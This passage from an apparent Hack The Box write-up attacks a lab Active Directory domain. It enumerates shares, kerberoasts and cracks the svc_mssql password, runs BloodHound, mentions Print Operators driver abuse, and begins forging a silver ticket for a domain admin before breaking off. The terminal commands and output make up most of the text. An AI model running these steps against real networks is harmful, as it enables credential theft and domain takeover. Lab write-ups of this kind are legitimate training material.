Default<span class="w"> </span>principal:<span class="w"> </span>julia.wong@BREACH.VL

Valid<span class="w"> </span>starting<span class="w">       </span>Expires<span class="w">              </span>Service<span class="w"> </span>principal
<span class="m">10</span>/25/2025<span class="w"> </span><span class="m">01</span>:29:19<span class="w">  </span><span class="m">10</span>/25/2025<span class="w"> </span><span class="m">11</span>:29:19<span class="w">  </span>krbtgt/BREACH.VL@BREACH.VL
<span class="w">        </span>renew<span class="w"> </span><span class="k">until</span><span class="w"> </span><span class="m">10</span>/26/2025<span class="w"> </span><span class="m">01</span>:29:19
</code></pre></div><p></p>
<h2 id="what-can-juliawong-do">What can julia.wong do<a class="headerlink" href="#what-can-juliawong-do" title="Permanent link">¶</a></h2>
<p>The user can read/write on the <code>share</code> share, and read on the <code>users</code> share</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/breach<span class="o">]</span>
└─$<span class="w"> </span>nxc<span class="w"> </span>smb<span class="w"> </span>breachdc.breach.vl<span class="w"> </span>-k<span class="w"> </span>--use-kcache<span class="w"> </span>--shares
SMB<span class="w">         </span>breachdc.breach.vl<span class="w"> </span><span class="m">445</span><span class="w">    </span>BREACHDC<span class="w">         </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2022</span><span class="w"> </span>Build<span class="w"> </span><span class="m">20348</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:BREACHDC<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:breach.vl<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB<span class="w">         </span>breachdc.breach.vl<span class="w"> </span><span class="m">445</span><span class="w">    </span>BREACHDC<span class="w">         </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>BREACH.VL<span class="se">\j</span>ulia.wong<span class="w"> </span>from<span class="w"> </span>ccache<span class="w"> </span>
SMB<span class="w">         </span>breachdc.breach.vl<span class="w"> </span><span class="m">445</span><span class="w">    </span>BREACHDC<span class="w">         </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Enumerated<span class="w"> </span>shares
SMB<span class="w">         </span>breachdc.breach.vl<span class="w"> </span><span class="m">445</span><span class="w">    </span>BREACHDC<span class="w">         </span>Share<span class="w">           </span>Permissions<span class="w">     </span>Remark
SMB<span class="w">         </span>breachdc.breach.vl<span class="w"> </span><span class="m">445</span><span class="w">    </span>BREACHDC<span class="w">         </span>-----<span class="w">           </span>-----------<span class="w">     </span>------
SMB<span class="w">         </span>breachdc.breach.vl<span class="w"> </span><span class="m">445</span><span class="w">    </span>BREACHDC<span class="w">         </span>ADMIN$<span class="w">                          </span>Remote<span class="w"> </span>Admin
SMB<span class="w">         </span>breachdc.breach.vl<span class="w"> </span><span class="m">445</span><span class="w">    </span>BREACHDC<span class="w">         </span>C$<span class="w">                              </span>Default<span class="w"> </span>share
SMB<span class="w">         </span>breachdc.breach.vl<span class="w"> </span><span class="m">445</span><span class="w">    </span>BREACHDC<span class="w">         </span>IPC$<span class="w">            </span>READ<span class="w">            </span>Remote<span class="w"> </span>IPC
SMB<span class="w">         </span>breachdc.breach.vl<span class="w"> </span><span class="m">445</span><span class="w">    </span>BREACHDC<span class="w">         </span>NETLOGON<span class="w">        </span>READ<span class="w">            </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="w"> </span>
SMB<span class="w">         </span>breachdc.breach.vl<span class="w"> </span><span class="m">445</span><span class="w">    </span>BREACHDC<span class="w">         </span>share<span class="w">           </span>READ,WRITE<span class="w">      </span>
SMB<span class="w">         </span>breachdc.breach.vl<span class="w"> </span><span class="m">445</span><span class="w">    </span>BREACHDC<span class="w">         </span>SYSVOL<span class="w">          </span>READ<span class="w">            </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="w"> </span>
SMB<span class="w">         </span>breachdc.breach.vl<span class="w"> </span><span class="m">445</span><span class="w">    </span>BREACHDC<span class="w">         </span>Users<span class="w">           </span>READ
</code></pre></div>
<p>Nothing particularly interesting in the <code>users</code> share for <code>julia.wong</code>, but the <code>share</code> share, <code>julia.wong</code> directory, found a <code>user.txt</code>.</p>
<p>Flag:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># pwd</span>
/transfer/julia.wong
<span class="c1"># cat user.txt</span>
55d33e52bc5fa7a687b9f0dcfa103dda
</code></pre></div>
<p>Get a list of usernames</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/breach<span class="o">]</span>
└─$<span class="w"> </span>impacket-GetADUsers<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>-all<span class="w"> </span>breach.vl/julia.wong@breachdc.breach.vl<span class="w">  </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">'{print $1}'</span>
Impacket

<span class="o">[</span>*<span class="o">]</span>
<span class="o">[</span>*<span class="o">]</span>
Name
--------------------
Administrator
Guest
krbtgt
Claire.Pope
Julia.Wong
Hilary.Reed
Diana.Pope
Jasmine.Price
George.Williams
Lawrence.Kaur
Jasmine.Slater
Hugh.Watts
Christine.Bruce
svc_mssql
</code></pre></div>
<p>When trying to kerberoast users, I found a type 18 hash for <code>krbtgt</code> (typically that account is uncrackable), and a type 23 for user <code>svc_mssql</code>, really only the latter is interesting/likely.
</p><div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/breach<span class="o">]</span>
└─$<span class="w"> </span>impacket-GetUserSPNs<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>-usersfile<span class="w"> </span>usernames.txt<span class="w"> </span>breach.vl/julia.wong@breachdc.breach.vl
Impacket<span class="w"> </span>v0.13.0.dev0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span>Fortra,<span class="w"> </span>LLC<span class="w"> </span>and<span class="w"> </span>its<span class="w"> </span>affiliated<span class="w"> </span>companies

<span class="o">[</span>...<span class="o">]</span>
<span class="nv">$krb5tgs$23$*</span>svc_mssql<span class="nv">$BREACH</span>.VL<span class="nv">$svc_mssql</span>*<span class="nv">$a5e7289dba70d9f14d87fe9a9c755c68$5</span>fa599a1f540061fb2ac763183bee9345f919e74475ec9ebd3ed16577467bbac36687f40bde507966e4c69160e124809694d4e439b6cf7b6e13a3fa979d41b89def9d4092e4d500279393a2c4053816ce493380a91cc6d3df537878386c5232d05e55fe5b383595a598a3ba6d851aa8050e24acd3e9262338cbbf217362628cd879d2bf28b71cc8490f4f925985e925e0c11cb034e0f596fdcc880cf776ff89bf074653fc845517fdf20fc000a764d60e8e40f02749fab8d3e933f97b5716c50e25ae5276b63f9f9cdb79310e2b78341e1e28cfd318aebcb161f24ef5375a24aef19fecdbfd6fcec43ef3a68ecd77a9871d5bc60d38b8fefef96bd8a8f3d810f99e072101544c016c59e5ae7e77b6d00374ddb6b8d04e66019cfbe4844d5f6e20ce0da93e5cb90d1166e3443938592c18cef268e1d03ec231386de645d06755c3413364e48cf7f0b2d043e8dfdd77cc1c36683f04ab393d09f80f3801a654d46632492d47a0e3202ee8893be81b99b2321912570ff009583eac925dd6c8cc8cfec9f6722d46fdbdbd9668cc69f381344c0fb2a289e4156e279cd45839f59967db489be7804b68cf4e28338e57265d80c738af907b6da89dd955ba8e4fbf964d302179cfe9b1933fa4c048a7323063c8d533f5109dc44322499332d74fcc1e5e413c836d0d327d32e776907a45aa16b338ab60498c3282ff349f3449db104045167faa0e1dd478fe592aaf0658d9c90083b83463071b26dfc0aed506d0d45e7d6d7eec361112a63390e5e8a302179be563639721362f8ae6a5a7ff7df22c658e855e0708fbc801b97249017540097ae081a63a1f421264dbbe87058043aa70ae5cd07d852a9c83a3ae6fb6be011fb25beed055597518e8ab08245ca90526c4b7ffa9d778c4ffbc91b9b5cdc87f01c92510a1e6a90f353fd695b1b538f6760dd983f1a404d581375b90e0cee7b53770fd448123d2dfcabf056ace05258f2d693d261e4380b81a53c392805e68b235ea14f75dadd658b766cc62829d834123a20624c2cd731083019bc3967bbb03874455cc0a7798af7c4b65329be27df0d3497fc1c3386b9c1cf01f4f9f210610c8fe82c9676be0ea048311245ab7a1b953a2f7b14745ccf3a72c08690bbe58278bed055a37a15cbf7afd650846d941f0bf590f9fafa8bd3b8cc9192731643116b3e1026630fb891833586ee59ac42747b69052aefd46c58275a857c2b0630021d922a223e443ea7eaaffa6374123d1e800fdbf97919a898fc38e9244b2af807bb145e670646d02162f052392bd7e5624ffd01dde9f51f28907df02281f979994bd5cb9a8b19574c346a716b0abac13669813c11dbfdd1bbc8640b62f256f62c1214b9d845992dadee03fa5fb7c28ac6a83b5d0f4675f9a80741e25507132a52710d972d887fcd5d0df9a21490e432be1e8f7a069e3ddef21121c7142f8e54cd29399b00c5adeabc
</code></pre></div><p></p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/breach<span class="o">]</span>
└─$<span class="w"> </span>hashcat<span class="w"> </span>--identify<span class="w"> </span>svc_mssql.hash<span class="w"> </span>
The<span class="w"> </span>following<span class="w"> </span>hash-mode<span class="w"> </span>match<span class="w"> </span>the<span class="w"> </span>structure<span class="w"> </span>of<span class="w"> </span>your<span class="w"> </span>input<span class="w"> </span>hash:

<span class="w">      </span><span class="c1"># | Name                                                       | Category</span>
<span class="w">  </span><span class="o">======</span>+<span class="o">============================================================</span>+<span class="o">======================================</span>
<span class="w">  </span><span class="m">13100</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Kerberos<span class="w"> </span><span class="m">5</span>,<span class="w"> </span>etype<span class="w"> </span><span class="m">23</span>,<span class="w"> </span>TGS-REP<span class="w">                              </span><span class="p">|</span><span class="w"> </span>Network<span class="w"> </span>Protocol


┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/breach<span class="o">]</span>
└─$<span class="w"> </span>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>svc_mssql.hash<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>--force<span class="w"> </span>--quiet<span class="w"> </span>
<span class="nv">$krb5tgs$23$*</span>svc_mssql<span class="nv">$BREACH</span>.VL<span class="nv">$svc_mssql</span>*<span class="nv">$a5e7289dba70d9f14d87fe9a9c755c68$5</span>fa599a1f540061fb2ac763183bee9345f919e74475ec9ebd3ed16577467bbac36687f40bde507966e4c69160e124809694d4e439b6cf7b6e13a3fa979d41b89def9d4092e4d500279393a2c4053816ce493380a91cc6d3df537878386c5232d05e55fe5b383595a598a3ba6d851aa8050e24acd3e9262338cbbf217362628cd879d2bf28b71cc8490f4f925985e925e0c11cb034e0f596fdcc880cf776ff89bf074653fc845517fdf20fc000a764d60e8e40f02749fab8d3e933f97b5716c50e25ae5276b63f9f9cdb79310e2b78341e1e28cfd318aebcb161f24ef5375a24aef19fecdbfd6fcec43ef3a68ecd77a9871d5bc60d38b8fefef96bd8a8f3d810f99e072101544c016c59e5ae7e77b6d00374ddb6b8d04e66019cfbe4844d5f6e20ce0da93e5cb90d1166e3443938592c18cef268e1d03ec231386de645d06755c3413364e48cf7f0b2d043e8dfdd77cc1c36683f04ab393d09f80f3801a654d46632492d47a0e3202ee8893be81b99b2321912570ff009583eac925dd6c8cc8cfec9f6722d46fdbdbd9668cc69f381344c0fb2a289e4156e279cd45839f59967db489be7804b68cf4e28338e57265d80c738af907b6da89dd955ba8e4fbf964d302179cfe9b1933fa4c048a7323063c8d533f5109dc44322499332d74fcc1e5e413c836d0d327d32e776907a45aa16b338ab60498c3282ff349f3449db104045167faa0e1dd478fe592aaf0658d9c90083b83463071b26dfc0aed506d0d45e7d6d7eec361112a63390e5e8a302179be563639721362f8ae6a5a7ff7df22c658e855e0708fbc801b97249017540097ae081a63a1f421264dbbe87058043aa70ae5cd07d852a9c83a3ae6fb6be011fb25beed055597518e8ab08245ca90526c4b7ffa9d778c4ffbc91b9b5cdc87f01c92510a1e6a90f353fd695b1b538f6760dd983f1a404d581375b90e0cee7b53770fd448123d2dfcabf056ace05258f2d693d261e4380b81a53c392805e68b235ea14f75dadd658b766cc62829d834123a20624c2cd731083019bc3967bbb03874455cc0a7798af7c4b65329be27df0d3497fc1c3386b9c1cf01f4f9f210610c8fe82c9676be0ea048311245ab7a1b953a2f7b14745ccf3a72c08690bbe58278bed055a37a15cbf7afd650846d941f0bf590f9fafa8bd3b8cc9192731643116b3e1026630fb891833586ee59ac42747b69052aefd46c58275a857c2b0630021d922a223e443ea7eaaffa6374123d1e800fdbf97919a898fc38e9244b2af807bb145e670646d02162f052392bd7e5624ffd01dde9f51f28907df02281f979994bd5cb9a8b19574c346a716b0abac13669813c11dbfdd1bbc8640b62f256f62c1214b9d845992dadee03fa5fb7c28ac6a83b5d0f4675f9a80741e25507132a52710d972d887fcd5d0df9a21490e432be1e8f7a069e3ddef21121c7142f8e54cd29399b00c5adeabc:Trustno1
</code></pre></div>
<p>Credential:</p>
<div class="highlight"><pre><span></span><code>svc_mssql:Trustno1
</code></pre></div>
<p>Get a ccache</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/breach<span class="o">]</span>
└─$<span class="w"> </span>impacket-getTGT<span class="w"> </span>breach.vl/svc_mssql:Trustno1
Impacket<span class="w"> </span>v0.13.0.dev0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span>Fortra,<span class="w"> </span>LLC<span class="w"> </span>and<span class="w"> </span>its<span class="w"> </span>affiliated<span class="w"> </span>companies<span class="w"> </span>

<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Saving<span class="w"> </span>ticket<span class="w"> </span><span class="k">in</span><span class="w"> </span>svc_mssql.ccache
</code></pre></div>
<p>This is a good start.  Lets examine with <code>Bloodhound</code>.</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/breach<span class="o">]</span>
└─$<span class="w"> </span>bloodhound-ce-python<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>-d<span class="w"> </span>breach.vl<span class="w"> </span>-u<span class="w"> </span>julia.wong<span class="w"> </span>-dc<span class="w"> </span>breachdc.breach.vl<span class="w"> </span>-c<span class="w"> </span>all<span class="w"> </span>--zip<span class="w"> </span>-op<span class="w"> </span>bloody
INFO:<span class="w"> </span>BloodHound.py<span class="w"> </span><span class="k">for</span><span class="w"> </span>BloodHound<span class="w"> </span>Community<span class="w"> </span>Edition
INFO:<span class="w"> </span>Found<span class="w"> </span>AD<span class="w"> </span>domain:<span class="w"> </span>breach.vl
INFO:<span class="w"> </span>Using<span class="w"> </span>TGT<span class="w"> </span>from<span class="w"> </span>cache
INFO:<span class="w"> </span>Found<span class="w"> </span>TGT<span class="w"> </span>with<span class="w"> </span>correct<span class="w"> </span>principal<span class="w"> </span><span class="k">in</span><span class="w"> </span>ccache<span class="w"> </span>file.
INFO:<span class="w"> </span>Connecting<span class="w"> </span>to<span class="w"> </span>LDAP<span class="w"> </span>server:<span class="w"> </span>breachdc.breach.vl
INFO:<span class="w"> </span>Found<span class="w"> </span><span class="m">1</span><span class="w"> </span>domains
INFO:<span class="w"> </span>Found<span class="w"> </span><span class="m">1</span><span class="w"> </span>domains<span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span>forest
INFO:<span class="w"> </span>Found<span class="w"> </span><span class="m">1</span><span class="w"> </span>computers
INFO:<span class="w"> </span>Connecting<span class="w"> </span>to<span class="w"> </span>LDAP<span class="w"> </span>server:<span class="w"> </span>breachdc.breach.vl
INFO:<span class="w"> </span>Found<span class="w"> </span><span class="m">15</span><span class="w"> </span>users
INFO:<span class="w"> </span>Found<span class="w"> </span><span class="m">54</span><span class="w"> </span>groups
INFO:<span class="w"> </span>Found<span class="w"> </span><span class="m">2</span><span class="w"> </span>gpos
INFO:<span class="w"> </span>Found<span class="w"> </span><span class="m">2</span><span class="w"> </span>ous
INFO:<span class="w"> </span>Found<span class="w"> </span><span class="m">19</span><span class="w"> </span>containers
INFO:<span class="w"> </span>Found<span class="w"> </span><span class="m">0</span><span class="w"> </span>trusts
INFO:<span class="w"> </span>Starting<span class="w"> </span>computer<span class="w"> </span>enumeration<span class="w"> </span>with<span class="w"> </span><span class="m">10</span><span class="w"> </span>workers
INFO:<span class="w"> </span>Querying<span class="w"> </span>computer:<span class="w"> </span>BREACHDC.breach.vl
INFO:<span class="w"> </span>Done<span class="w"> </span><span class="k">in</span><span class="w"> </span>00M<span class="w"> </span>26S
INFO:<span class="w"> </span>Compressing<span class="w"> </span>output<span class="w"> </span>into<span class="w"> </span>20251025015627_bloodhound.zip
</code></pre></div>
<p>Interestingly, <code>Julia.wong</code> is a member of <code>Staff</code> and <code>Print Operators</code>.</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251025020124.png" data-desc-position="bottom"><img alt="Pasted_image_20251025020124.png" src="../../../../Pasted_image_20251025020124.png"></a></p>
<p>There is nothing particularly interesting about the <code>Staff</code> group, but <code>Print Operators</code>:
<a href="https://notes.dollarboysushil.com/windows-privilege-escalation/group-privileges/print-operators">https://notes.dollarboysushil.com/windows-privilege-escalation/group-privileges/print-operators</a>
</p><div class="highlight"><pre><span></span><code>The **Print Operators** group is a highly privileged group in Windows that grants its members several significant permissions, including:

- `**SeLoadDriverPrivilege**`: Allows members to load and manage system drivers.

- The ability to manage, create, share, and delete printers connected to a Domain Controller.

- The ability to log on locally to a Domain Controller and shut it down.
</code></pre></div><p></p>
<p>There is also the potential to execute shellcode in the context of <code>NT AUTHORITY\System</code>, using the <code>Capcom.sys</code> driver.</p>
<p>Maybe this is something, maybe it is not.  I might circle back to this. </p>
<p>One other thing I saw was that there is a domain admin user, <code>christine.bruce</code>, which has password not required set:</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251025025356.png" data-desc-position="bottom"><img alt="Pasted_image_20251025025356.png" src="../../../../Pasted_image_20251025025356.png"></a></p>
<p>That is pretty interesting, but not sure how that could work out from here.</p>
<h2 id="get-a-shell">Get a shell<a class="headerlink" href="#get-a-shell" title="Permanent link">¶</a></h2>
<p>Both of my controlled users are guests on the <code>mssql</code> instance</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/breach<span class="o">]</span>
└─$<span class="w"> </span>impacket-mssqlclient<span class="w"> </span>breach.vl/julia.wong:Computer1@breachdc.breach.vl<span class="w"> </span>-windows-auth
Impacket<span class="w"> </span>v0.13.0.dev0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span>Fortra,<span class="w"> </span>LLC<span class="w"> </span>and<span class="w"> </span>its<span class="w"> </span>affiliated<span class="w"> </span>companies<span class="w"> </span>

<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Encryption<span class="w"> </span>required,<span class="w"> </span>switching<span class="w"> </span>to<span class="w"> </span>TLS
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>:<span class="w"> </span>Old<span class="w"> </span>Value:<span class="w"> </span>master,<span class="w"> </span>New<span class="w"> </span>Value:<span class="w"> </span>master
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>:<span class="w"> </span>Old<span class="w"> </span>Value:<span class="w"> </span>,<span class="w"> </span>New<span class="w"> </span>Value:<span class="w"> </span>us_english
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>:<span class="w"> </span>Old<span class="w"> </span>Value:<span class="w"> </span><span class="m">4096</span>,<span class="w"> </span>New<span class="w"> </span>Value:<span class="w"> </span><span class="m">16192</span>
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>INFO<span class="o">(</span>BREACHDC<span class="se">\S</span>QLEXPRESS<span class="o">)</span>:<span class="w"> </span>Line<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>Changed<span class="w"> </span>database<span class="w"> </span>context<span class="w"> </span>to<span class="w"> </span><span class="s1">'master'</span>.
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>INFO<span class="o">(</span>BREACHDC<span class="se">\S</span>QLEXPRESS<span class="o">)</span>:<span class="w"> </span>Line<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>Changed<span class="w"> </span>language<span class="w"> </span>setting<span class="w"> </span>to<span class="w"> </span>us_english.
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>ACK:<span class="w"> </span>Result:<span class="w"> </span><span class="m">1</span><span class="w"> </span>-<span class="w"> </span>Microsoft<span class="w"> </span>SQL<span class="w"> </span>Server<span class="w"> </span><span class="o">(</span><span class="m">150</span><span class="w"> </span><span class="m">7208</span><span class="o">)</span><span class="w"> </span>
<span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Press<span class="w"> </span><span class="nb">help</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>extra<span class="w"> </span>shell<span class="w"> </span>commands
SQL<span class="w"> </span><span class="o">(</span>BREACH<span class="se">\J</span>ulia.Wong<span class="w">  </span>guest@master<span class="o">)</span>&gt;<span class="w"> </span><span class="nb">exit</span>

┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/breach<span class="o">]</span>
└─$<span class="w"> </span>impacket-mssqlclient<span class="w"> </span>breach.vl/svc_mssql:Trustno1@breachdc.breach.vl<span class="w"> </span>-windows-auth
Impacket<span class="w"> </span>v0.13.0.dev0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span>Fortra,<span class="w"> </span>LLC<span class="w"> </span>and<span class="w"> </span>its<span class="w"> </span>affiliated<span class="w"> </span>companies<span class="w"> </span>

<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Encryption<span class="w"> </span>required,<span class="w"> </span>switching<span class="w"> </span>to<span class="w"> </span>TLS
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>:<span class="w"> </span>Old<span class="w"> </span>Value:<span class="w"> </span>master,<span class="w"> </span>New<span class="w"> </span>Value:<span class="w"> </span>master
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>:<span class="w"> </span>Old<span class="w"> </span>Value:<span class="w"> </span>,<span class="w"> </span>New<span class="w"> </span>Value:<span class="w"> </span>us_english
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>:<span class="w"> </span>Old<span class="w"> </span>Value:<span class="w"> </span><span class="m">4096</span>,<span class="w"> </span>New<span class="w"> </span>Value:<span class="w"> </span><span class="m">16192</span>
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>INFO<span class="o">(</span>BREACHDC<span class="se">\S</span>QLEXPRESS<span class="o">)</span>:<span class="w"> </span>Line<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>Changed<span class="w"> </span>database<span class="w"> </span>context<span class="w"> </span>to<span class="w"> </span><span class="s1">'master'</span>.
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>INFO<span class="o">(</span>BREACHDC<span class="se">\S</span>QLEXPRESS<span class="o">)</span>:<span class="w"> </span>Line<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>Changed<span class="w"> </span>language<span class="w"> </span>setting<span class="w"> </span>to<span class="w"> </span>us_english.
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>ACK:<span class="w"> </span>Result:<span class="w"> </span><span class="m">1</span><span class="w"> </span>-<span class="w"> </span>Microsoft<span class="w"> </span>SQL<span class="w"> </span>Server<span class="w"> </span><span class="o">(</span><span class="m">150</span><span class="w"> </span><span class="m">7208</span><span class="o">)</span><span class="w"> </span>
<span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Press<span class="w"> </span><span class="nb">help</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>extra<span class="w"> </span>shell<span class="w"> </span>commands
SQL<span class="w"> </span><span class="o">(</span>BREACH<span class="se">\s</span>vc_mssql<span class="w">  </span>guest@master<span class="o">)</span>&gt;<span class="w"> </span><span class="nb">exit</span>
</code></pre></div>
<p>I do have the credentials for the <code>svc_mssql</code> user, and their SPN is <code>MSSQLSvc/breachdc.breach.vl:1433</code>.  I could forge a silver ticket for that SPN for <code>christine</code>.  Lets do that</p>
<div class="highlight"><pre><span></span><code><span class="err">┌──</span><span class="p">(</span><span class="n">notroot</span><span class="err">㉿</span><span class="n">elysium</span><span class="p">)</span><span class="o">-</span><span class="p">[(</span><span class="n">master</span><span class="p">)</span> <span class="mi">1</span> <span class="o">~/</span><span class="n">htb</span><span class="o">/</span><span class="n">machines</span><span class="o">/</span><span class="n">breach</span><span class="p">]</span>
<span class="err">└─$</span> <span class="n">cat</span> <span class="o">~/</span><span class="nb">bin</span><span class="o">/</span><span class="n">password_to_ntlm_hash</span><span class="o">.</span><span class="n">py</span> 
<span class="c1">#!/usr/bin/env python3</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">binascii</span>

<span class="k">def</span><span class="w"> </span><span class="nf">convert_to_ntlm</span><span class="p">(</span><span class="n">password</span><span class="p">):</span>
    <span class="n">encoded_password</span> <span class="o">=</span> <span class="n">password</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'utf-16le'</span><span class="p">)</span>
    <span class="n">md4_hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">'md4'</span><span class="p">,</span> <span class="n">encoded_password</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
    <span class="n">ntlm_hash</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">md4_hash</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">ntlm_hash</span>

<span class="n">password</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">"Give password:&gt; "</span><span class="p">)</span>
<span class="n">ntlm_hash</span> <span class="o">=</span> <span class="n">convert_to_ntlm</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Password: </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"NTLM Hash: </span><span class="si">{</span><span class="n">ntlm_hash</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
</code></pre></div>
<p>Hash <code>svc_mssqls</code> password using the above script</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/breach<span class="o">]</span>
└─$<span class="w"> </span>~/bin/password_to_ntlm_hash.py
Give<span class="w"> </span>password:&gt;<span class="w"> </span>Trustno1
Password:<span class="w"> </span>Trustno1
NTLM<span class="w"> </span>Hash:<span class="w"> </span>69596c7aa1e8daee17f8e78870e25a5c
</code></pre></div>
<p>Forge a service ticket for <code>christine.bruce</code>, for the <code>MSSQLSvc/</code> SPN.</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/breach<span class="o">]</span>
└─$<span class="w"> </span>impacket-ticketer<span class="w"> </span>-domain<span class="w"> </span>breach.vl<span class="w"> </span>-domain-sid<span class="w"> </span>S-1-5-21-2330692793-3312915120-706255856<span class="w"> </span>-spn<span class="w"> </span>MSSQLSvc/breachdc.breach.vl:1433<span class="w"> </span>-nthash<span class="w"> </span>69596c7aa1e8daee17f8e78870e25a5c<span class="w"> </span>christine.bruce
Impacket<span class="w"> </span>v0.13.0.dev0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span>Fortra,<span class="w"> </span>LLC<span class="w"> </span>and<span class="w"> </span>its<span class="w"> </span>affiliated<span class="w"> </span>companies<span class="w"> </span>

